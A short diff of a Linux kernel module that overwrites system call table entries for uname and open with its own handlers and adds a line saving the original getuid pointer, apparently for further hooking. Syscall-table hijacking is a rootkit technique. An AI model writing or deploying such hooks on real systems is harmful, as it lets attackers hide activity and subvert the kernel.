@@ -66,6 +66,9 @@ static int __init entry_point(void)
     system_call_table_addr[__NR_uname] = overide_uname;
     system_call_table_addr[__NR_open] = overide_open;
 
+	getuid_call = system_call_table_addr[__NR_getuid];
+
+
     printk(KERN_INFO "[STATE]:\tModule loaded into kernel space.\n");
     return 0;
 }
